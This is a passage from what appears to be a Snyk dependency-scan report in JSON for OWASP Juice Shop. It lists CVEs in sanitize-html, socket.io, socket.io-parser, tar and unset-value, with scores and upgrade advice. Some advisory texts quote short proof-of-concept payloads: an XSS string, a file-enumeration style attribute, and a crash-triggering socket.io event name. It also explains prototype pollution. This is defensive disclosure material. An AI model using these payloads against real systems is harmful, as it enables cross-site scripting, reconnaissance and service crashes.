            "modificationTime": "2024-03-06T14:09:38.608475Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
            "assigner": "NVD",
            "severity": "medium",
            "baseScore": 5.3,
            "cvssVersion": "3.1",
            "modificationTime": "2025-04-26T01:13:30.324678Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
            "assigner": "Red Hat",
            "severity": "medium",
            "baseScore": 5.3,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:52:49.970725Z"
          }
        ],
        "description": "## Overview\n[sanitize-html](https://github.com/punkave/sanitize-html) is a library that allows you to clean up user-submitted HTML, preserving whitelisted elements and whitelisted attributes on a per-element basis\n\nAffected versions of this package are vulnerable to Information Exposure when used on the backend and with the `style` attribute allowed, allowing enumeration of files in the system (including project dependencies). An attacker could exploit this vulnerability to gather details about the file system structure and dependencies of the targeted server.\n## PoC\n```js\r\n// index.js\r\nconst sanitizeHtml = require('sanitize-html');\r\n\r\nconst file_exist = `<a style='background-image: url(\"/*# sourceMappingURL=./node_modules/sanitize-html/index.js */\");'>@slonser_</a>`;\r\nconst file_notexist = `<a style='background-image: url(\"/*# sourceMappingURL=./node_modules/randomlibrary/index.js */\");'>@slonser_</a>`;\r\n\r\nconst file_exist_clean = sanitizeHtml(file_exist, {\r\nallowedAttributes: { ...sanitizeHtml.defaults.allowedAttributes, a: ['style'] },\r\n})\r\n\r\nconst file_notexist_clean = sanitizeHtml(file_notexist, {\r\n    allowedAttributes: { ...sanitizeHtml.defaults.allowedAttributes, a: ['style'] },\r\n})\r\nconsole.log(file_exist_clean, \"// valid file path on backend\")\r\nconsole.log(file_notexist_clean, \"// invalid file path on backend\")\r\n```\n## Remediation\nUpgrade `sanitize-html` to version 2.12.1 or higher.\n## References\n- [Github Commit](https://github.com/apostrophecms/sanitize-html/commit/c5dbdf77fe8b836d3bf4554ea39edb45281ec0b4)\n- [Github Discussion](https://github.com/apostrophecms/apostrophe/discussions/4436)\n- [GitHub Gist](https://gist.github.com/Slonser/8b4d061abe6ee1b2e10c7242987674cf)\n- [Github PR](https://github.com/apostrophecms/sanitize-html/pull/650)\n",
        "epssDetails": {
          "percentile": "0.79412",
          "probability": "0.01341",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-21501"
          ],
          "CWE": [
            "CWE-200"
          ]
        },
        "packageName": "sanitize-html",
        "proprietary": true,
        "creationTime": "2024-02-21T13:28:20.563017Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-02-20T14:13:15Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-02-23T07:20:17.566657Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-04-26T01:13:30.324678Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "sanitize-html@1.4.2"
        ],
        "upgradePath": [
          false,
          "sanitize-html@2.12.1"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "sanitize-html",
        "version": "1.4.2"
      },
      {
        "id": "npm:sanitize-html:20141024",
        "title": "Cross-site Scripting (XSS)",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N",
        "credit": [
          "Unknown"
        ],
        "semver": {
          "vulnerable": [
            "<1.4.3"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [
          "1.4.3"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 4.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "sanitize-html",
        "references": [
          {
            "url": "https://raw.githubusercontent.com/distributedweaknessfiling/cvelist/master/2016/1000xxx/CVE-2016-1000237.json",
            "title": "CVE"
          },
          {
            "url": "https://github.com/punkave/sanitize-html/issues/29",
            "title": "GitHub Issue"
          },
          {
            "url": "https://nodesecurity.io/advisories/135",
            "title": "Node Security Advisories"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            "cvssV3BaseScore": 6.1,
            "modificationTime": "2024-03-11T09:46:29.136333Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 4.3,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T13:57:29.366187Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            "assigner": "NVD",
            "severity": "medium",
            "baseScore": 6.1,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:46:29.136333Z"
          }
        ],
        "description": "## Overview\r\n\r\nSince the sanitize-html module trusts 'text' coming from htmlparser2, and outputs it without further escaping (because htmlparser2 does not decode entities in text before delivering it), this results in an XSS attack vector if sanitize-html ignores the img tag (according to user-configured filter rules) but passes the text intact, as it must do to keep any text in documents.\r\n\r\n\r\n## References\r\n- https://github.com/punkave/sanitize-html/issues/29",
        "epssDetails": {
          "percentile": "0.55335",
          "probability": "0.00328",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2016-1000237"
          ],
          "CWE": [
            "CWE-79"
          ],
          "GHSA": [
            "GHSA-3j7m-hmh3-9jmp"
          ],
          "ALTERNATIVE": [
            "SNYK-JS-SANITIZEHTML-10048",
            "npm:sanitize-html:20141024"
          ]
        },
        "packageName": "sanitize-html",
        "proprietary": false,
        "creationTime": "2015-11-06T02:09:36.180000Z",
        "functions_new": [],
        "alternativeIds": [
          "SNYK-JS-SANITIZEHTML-10048"
        ],
        "disclosureTime": "2015-11-06T02:09:36Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2015-11-06T02:09:36Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:46:29.136333Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "sanitize-html@1.4.2"
        ],
        "upgradePath": [
          false,
          "sanitize-html@1.4.3"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "sanitize-html",
        "version": "1.4.2"
      },
      {
        "id": "npm:sanitize-html:20160801",
        "title": "Cross-site Scripting (XSS)",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N",
        "credit": [
          "Björn Kimminich"
        ],
        "semver": {
          "vulnerable": [
            "<=1.4.2"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 4.7,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "sanitize-html",
        "references": [
          {
            "url": "https://github.com/punkave/sanitize-html/commit/762fbc7bba389f3f789cc291c1eb2b64f60f2caf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/punkave/sanitize-html/issues/29",
            "title": "GitHub Issue"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 4.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T13:57:29.120089Z"
          }
        ],
        "description": "## Overview\nSanitization of HTML strings is not applied recursively to input, allowing an attacker to potentially inject script and other markup.\n\nSource: _Node Security Project_\n\n## Details\n<<XSS>>\n\n\n## Remediation\nUpgrade `sanitize-html` to `1.4.3` or later\n\n## References\n- https://github.com/punkave/sanitize-html/issues/29\n- https://github.com/punkave/sanitize-html/commit/762fbc7bba389f3f789cc291c1eb2b64f60f2caf\n\n",
        "epssDetails": null,
        "identifiers": {
          "CVE": [],
          "CWE": [
            "CWE-79"
          ],
          "NSP": [
            "135"
          ],
          "ALTERNATIVE": [
            "SNYK-JS-SANITIZEHTML-10127",
            "npm:sanitize-html:20160801"
          ]
        },
        "packageName": "sanitize-html",
        "proprietary": false,
        "creationTime": "2016-08-02T08:28:08.097000Z",
        "functions_new": [],
        "alternativeIds": [
          "SNYK-JS-SANITIZEHTML-10127"
        ],
        "disclosureTime": "2016-08-01T18:02:31Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2016-08-01T18:02:31Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-06T13:57:29.120089Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "sanitize-html@1.4.2"
        ],
        "upgradePath": [
          false,
          "sanitize-html@1.4.3"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "sanitize-html",
        "version": "1.4.2"
      },
      {
        "id": "npm:sanitize-html:20161026",
        "title": "Cross-site Scripting (XSS)",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N/E:F/RL:O/RC:C",
        "credit": [
          "Andrew Krasichkov"
        ],
        "semver": {
          "vulnerable": [
            "<1.11.4"
          ]
        },
        "exploit": "Functional",
        "fixedIn": [
          "1.11.4"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 5.4,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "sanitize-html",
        "references": [
          {
            "url": "https://github.com/punkave/sanitize-html/commit/5d205a1005ba0df80e21d8c64a15bb3accdb2403",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/punkave/sanitize-html/issues/100",
            "title": "GitHub Issue"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            "cvssV3BaseScore": 6.1,
            "modificationTime": "2024-03-11T09:46:56.793391Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N/E:F/RL:O/RC:C",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 5.4,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:02:37.681077Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            "assigner": "NVD",
            "severity": "medium",
            "baseScore": 6.1,
            "cvssVersion": "3.0",
            "modificationTime": "2024-03-11T09:46:56.793391Z"
          }
        ],
        "description": "## Overview\n[`sanitize-html`](https://www.npmjs.com/package/sanitize-html) is a library for scrubbing html input of malicious values.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) attacks. If at least one `nonTextTags` tag is allowed, a malicious user may potentially conduct an XSS attack.\n\n**PoC:**\n```js\nvar sanitizeHtml = require('sanitize-html');\n\nvar dirty = '!<textarea>&lt;/textarea&gt;<svg/onload=prompt`xs`&gt;</textarea>!';\nvar clean = sanitizeHtml(dirty, {\n    allowedTags: [ 'textarea' ]\n});\n\nconsole.log(clean);\n\n// !<textarea></textarea><svg/onload=prompt`xs`></textarea>!\n```\n\n## Details\n<<XSS>>\n\n\n## Remediation\nUpgrade `sanitize-html` to version 1.11.4 or later.\n\n## References\n- [GitHub Issue](https://github.com/punkave/sanitize-html/issues/100)\n- [GitHub Commit](https://github.com/punkave/sanitize-html/commit/5d205a1005ba0df80e21d8c64a15bb3accdb2403)\n",
        "epssDetails": {
          "percentile": "0.51890",
          "probability": "0.00286",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2017-16016"
          ],
          "CWE": [
            "CWE-79"
          ],
          "NSP": [
            "154"
          ],
          "GHSA": [
            "GHSA-xc6g-ggrc-qq4r"
          ],
          "ALTERNATIVE": [
            "SNYK-JS-SANITIZEHTML-10461",
            "npm:sanitize-html:20161026"
          ]
        },
        "packageName": "sanitize-html",
        "proprietary": false,
        "creationTime": "2017-04-12T10:49:58.283000Z",
        "functions_new": [],
        "alternativeIds": [
          "SNYK-JS-SANITIZEHTML-10461"
        ],
        "disclosureTime": "2016-03-26T23:49:58.283000Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Functional",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2017-04-12T11:00:58.283000Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:46:56.793391Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "sanitize-html@1.4.2"
        ],
        "upgradePath": [
          false,
          "sanitize-html@1.11.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "sanitize-html",
        "version": "1.4.2"
      },
      {
        "id": "SNYK-JS-SOCKETIO-7278048",
        "title": "Uncaught Exception",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
        "credit": [
          "Paul Taylor"
        ],
        "semver": {
          "vulnerable": [
            ">=2.3.0 <2.5.1",
            ">=3.0.0 <4.6.2"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [
          "2.5.1",
          "4.6.2"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "high",
        "cvssScore": 8.7,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "socket.io",
        "references": [
          {
            "url": "https://github.com/socketio/socket.io/commit/15af22fc22bc6030fcead322c106f07640336115",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/socketio/socket.io/commit/d30630ba10562bf987f4d2b42440fc41a828119c",
            "title": "GitHub Commit"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "SUSE",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cvssV3BaseScore": 7.5,
            "modificationTime": "2024-10-30T11:03:52.699601Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 8.7,
            "cvssVersion": "4.0",
            "modificationTime": "2024-06-20T06:22:00.788948Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-06-20T06:22:00.788948Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "assigner": "SUSE",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:03:52.699601Z"
          }
        ],
        "description": "## Overview\n[socket.io](https://github.com/socketio/socket.io) is a node.js realtime framework server.\n\nAffected versions of this package are vulnerable to Uncaught Exception in handling error events. If there is no listener set up for such events, an attacker can send packets containing them to crash the Node process. \r\n\r\n## Workaround\r\n\r\nThis vulnerability can be avoided by attaching a listener for error events, such as\r\n```\r\nio.on(\"connection\", (socket) => {\r\n  socket.on(\"error\", () => {\r\n    // ...\r\n  });\r\n});\r\n```\n## Remediation\nUpgrade `socket.io` to version 2.5.1, 4.6.2 or higher.\n## References\n- [GitHub Commit](https://github.com/socketio/socket.io/commit/15af22fc22bc6030fcead322c106f07640336115)\n- [GitHub Commit](https://github.com/socketio/socket.io/commit/d30630ba10562bf987f4d2b42440fc41a828119c)\n",
        "epssDetails": {
          "percentile": "0.28390",
          "probability": "0.00100",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-38355"
          ],
          "CWE": [
            "CWE-248"
          ],
          "GHSA": [
            "GHSA-25hc-qcg6-38wj"
          ]
        },
        "packageName": "socket.io",
        "proprietary": false,
        "creationTime": "2024-06-20T06:07:57.738611Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-06-19T20:40:57Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-06-20T06:22:00.788616Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-10-30T11:03:52.699601Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "juice-shop@19.0.0",
          "socket.io@3.1.2"
        ],
        "upgradePath": [
          false,
          "socket.io@4.6.2"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "socket.io",
        "version": "3.1.2"
      },
      {
        "id": "SNYK-JS-SOCKETIOPARSER-5596892",
        "title": "Denial of Service (DoS)",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
        "credit": [
          "rafax00"
        ],
        "semver": {
          "vulnerable": [
            ">=3.4.0 <3.4.3",
            ">=4.0.0 <4.2.3"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [
          "3.4.3",
          "4.2.3"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "high",
        "cvssScore": 7.5,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "socket.io-parser",
        "references": [
          {
            "url": "https://github.com/socketio/socket.io-parser/commit/2dc3c92622dad113b8676be06f23b1ed46b02ced",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/socketio/socket.io-parser/commit/3b78117bf6ba7e99d7a5cfc1ba54d0477554a7f3",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/socketio/socket.io-parser/releases/tag/3.4.3",
            "title": "GitHub Release"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cvssV3BaseScore": 7.5,
            "modificationTime": "2024-03-11T09:53:18.116269Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:04:09.831372Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "assigner": "NVD",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:53:18.116269Z"
          }
        ],
        "description": "## Overview\n[socket.io-parser](https://www.npmjs.org/package/socket.io-parser) is a socket.io protocol parser\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) due to insufficient validation when decoding a packet. An attacker can send an event with a name like `'2[{\"toString\":\"foo\"}]'` to trigger an uncaught exception and a crash, like the below.\r\n\r\n```\r\nTypeError: Cannot convert object to primitive value\r\n       at Socket.emit (node:events:507:25)\r\n       at .../node_modules/socket.io/lib/socket.js:531:14\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](https://security.snyk.io/vuln/SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `socket.io-parser` to version 3.4.3, 4.2.3 or higher.\n## References\n- [GitHub Commit](https://github.com/socketio/socket.io-parser/commit/2dc3c92622dad113b8676be06f23b1ed46b02ced)\n- [GitHub Commit](https://github.com/socketio/socket.io-parser/commit/3b78117bf6ba7e99d7a5cfc1ba54d0477554a7f3)\n- [GitHub Release](https://github.com/socketio/socket.io-parser/releases/tag/3.4.3)\n",
        "epssDetails": {
          "percentile": "0.37918",
          "probability": "0.00162",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2023-32695"
          ],
          "CWE": [
            "CWE-400"
          ],
          "GHSA": [
            "GHSA-cqmj-92xf-r6r9"
          ]
        },
        "packageName": "socket.io-parser",
        "proprietary": false,
        "creationTime": "2023-05-24T07:36:34.088298Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2023-05-23T19:55:13Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2023-05-24T07:39:19.358296Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:53:18.116269Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "juice-shop@19.0.0",
          "socket.io@3.1.2",
          "socket.io-parser@4.0.5"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "socket.io-parser",
        "version": "4.0.5"
      },
      {
        "id": "SNYK-JS-TAR-6476909",
        "title": "Uncontrolled Resource Consumption ('Resource Exhaustion')",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "Mohamed Dief"
        ],
        "semver": {
          "vulnerable": [
            "<6.2.1"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "6.2.1"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.5,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "tar",
        "references": [
          {
            "url": "https://github.com/isaacs/node-tar/commit/fe8cd57da5686f8695415414bda49206a545f7f7",
            "title": "GitHub Commit"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
            "cvssV3BaseScore": 6.5,
            "modificationTime": "2024-06-20T13:34:25.566902Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-29T11:51:08.899351Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
            "assigner": "Red Hat",
            "severity": "medium",
            "baseScore": 6.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-06-20T13:34:25.566902Z"
          }
        ],
        "description": "## Overview\n[tar](https://www.npmjs.com/package/tar) is a full-featured Tar for Node.js.\n\nAffected versions of this package are vulnerable to Uncontrolled Resource Consumption ('Resource Exhaustion') due to the lack of folders count validation during the folder creation process. An attacker who generates a large number of sub-folders can consume memory on the system running the software and even crash the client within few seconds of running it using a path with too many sub-folders inside.\n## Remediation\nUpgrade `tar` to version 6.2.1 or higher.\n## References\n- [GitHub Commit](https://github.com/isaacs/node-tar/commit/fe8cd57da5686f8695415414bda49206a545f7f7)\n",
        "epssDetails": {
          "percentile": "0.42247",
          "probability": "0.00198",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-28863"
          ],
          "CWE": [
            "CWE-400"
          ],
          "GHSA": [
            "GHSA-f5x3-32g6-xq36"
          ]
        },
        "packageName": "tar",
        "proprietary": false,
        "creationTime": "2024-03-22T12:56:33.802918Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-03-21T22:40:19Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-03-22T12:56:33.985087Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-06-20T13:34:25.566902Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "node-pre-gyp@0.15.0",
          "tar@4.4.19"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "tar",
        "version": "4.4.19"
      },
      {
        "id": "SNYK-JS-UNSETVALUE-2400660",
        "title": "Prototype Pollution",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
        "credit": [
          "khizar"
        ],
        "semver": {
          "vulnerable": [
            "<2.0.1"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [
          "2.0.1"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "high",
        "cvssScore": 7.5,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "unset-value",
        "references": [
          {
            "url": "https://github.com/jonschlinkert/unset-value/pull/12/commits/abb534769f6ea62c3dd988f5ce0a4ebd1f91b561",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/jonschlinkert/unset-value/issues/11",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/jonschlinkert/unset-value/pull/12",
            "title": "GitHub PR"
          },
          {
            "url": "https://github.com/jonschlinkert/unset-value/releases",
            "title": "GitHub Release"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T13:56:06.176520Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Prototype Pollution via the `unset` function in `index.js`, because it allows access to object prototype properties.\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| 